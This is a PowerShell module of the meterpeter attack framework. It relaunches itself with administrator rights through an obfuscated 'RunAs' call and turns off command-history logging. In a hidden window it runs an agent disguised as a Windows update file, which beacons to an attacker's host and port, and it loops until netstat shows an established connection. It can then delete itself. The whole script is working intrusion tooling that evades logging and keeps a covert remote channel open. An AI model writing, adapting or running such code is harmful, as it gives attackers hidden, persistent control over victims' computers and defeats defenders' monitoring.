<#
.SYNOPSIS
   UAC Auto-Elevate meterpeter client agent

   Author: @r00t-3xp10it
   Tested Under: Windows 10 (19044) x64 bits
   Required Dependencies: none
   Optional Dependencies: netstat
   PS cmdlet Dev version: v1.0.3

.DESCRIPTION
   Auxiliary module of Meterpeter v2.10.14 that allow users to
   elevate current terminal session from user -> administrator

.NOTES
   Warning: Target user will be prompt by UAC to run elevated.
   Warning: cmdlet will exit execution if target declines to run
   it with admin privileges by sellecting 'NO' button in UAC prompt
   Warning: Parameter -attacker 'LHOST:LPORT' allows this cmdlet to
   check for agent conection [loop] or abort cmdlet execution if any
   connection from server <-> client is found active (break loop)

.Parameter Attacker
   Attacker LHOST:LPORT (default: off)

.Parameter StartTime
   Schedule execution to HH:mm (default: off)

.Parameter AgentPath
   Meterpeter agent full path (default: $Env:TMP)

.Parameter AutoDel
   Switch that auto-deletes this cmdlet in the end

.EXAMPLE
   PS C:\> .\uaceop.ps1 -agentpath "$pwd"
   Update-KB5005101.ps1 directory full path
  
.EXAMPLE
   PS C:\> .\uaceop.ps1 -attacker '192.168.1.66:666' -autodel
   Loop agent execution until a connection its found active

.EXAMPLE
   PS C:\> .\uaceop.ps1 -starttime '09:34' -attacker '192.168.1.66:666' -autodel
   Schedule execution to HH:mm + loop agent execution until a connection its found active

.INPUTS
   None. You cannot pipe objects into UacEop.ps1

.OUTPUTS
   [*] Relaunch console as an elevated process ..
   [*] Executing meterpeter client [Admin:Comfirm]
   [*] Waiting connection from server ..
   [*] Executing meterpeter client [Admin:Comfirm]
   [-] Connection found, exit loop ..

.LINK
   https://github.com/r00t-3xp10it/meterpeter
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$AgentPath="$Env:TMP",
   [string]$StartTime="off",
   [string]$Attacker="off",
   [switch]$AutoDel
)


## Global variable declarations
$ErrorActionPreference = "SilentlyContinue"
## Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
## Send Attacker settings to logfile
echo "$Attacker" >> "$Env:TMP\fddr.log"


If($StartTime -Match '^(\d+\d+:+\d+\d)$')
{
   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Sleep for xx minutes function.
   #>

   write-host "[*] Schedule start at [" -NoNewline
   write-host "$StartTime" -ForegroundColor Red -NoNewline
   write-host "] hours."

   For(;;)
   {
      ## Compare $CurrentTime with $StartTime
      $CurrentTime = (Get-Date -Format 'HH:mm')
      If($CurrentTime -Match "^($StartTime)$")
      {
         break # Continue execution now
      }

      ## loop each 10 seconds
      Start-Sleep -Seconds 10
   }
}


$Attacker = (Get-Content -Path "$Env:TMP\fddr.log"|Select-Object -First 1)
If(-not([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
{
   $Namelless = "%R@unA@s%" -replace '(@|%)',''
   write-host "[*] Relaunch console as an elevated process .."
   Start-Process -WindowStyle Hidden powershell "-File",('"{0}"' -f $MyInvocation.MyCommand.Path) -Verb $Namelless
   exit
}


If($Attacker -match '^(off)$')
{
   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Execute agent WITHOUT confirm if connection has recived
   #>

   write-host "[*] Executing meterpeter client [Admin:Once]"
   Start-Process -WindowStyle Hidden powershell -ArgumentList "-file $Env:TMP\Update-KB5005101.ps1"   
}
Else
{
   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Execute agent and CONFIRM if connection has recived

   .NOTES
      Agent [Update-KB5005101.ps1] will beacon home from 10 to 10
      seconds unless UACeop.ps1 its stoped or an active connection
      its found from server <-> Client using netstat native command
   #>

   For(;;)
   {
      write-host "[*] Executing meterpeter client [Admin:Comfirm]"
      Start-Process -WindowStyle Hidden powershell -ArgumentList "-file $Env:TMP\Update-KB5005101.ps1"
      Start-Sleep -Seconds 10 ## Give extra time for agent to beacon home

      $CheckAgentConnection = (netstat -ano|findstr /C:"ESTABLISHED"|findstr /C:"$Attacker")
      If($CheckAgentConnection -match "$Attacker")
      {
         write-host "[-] Connection found, exit loop ..`n"
         break # Connection found, exit loop
      }
      Else
      {
         write-host "[*] Waiting connection from server .." -ForegroundColor Yellow
      }
   }
}


If($AutoDel.IsPresent)
{
   ## Auto-Delete cmdlet in the end ...
   Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force
}

Start-Sleep -Seconds 2
Remove-Item -Path "$Env:TMP\fddr.log" -Force
exit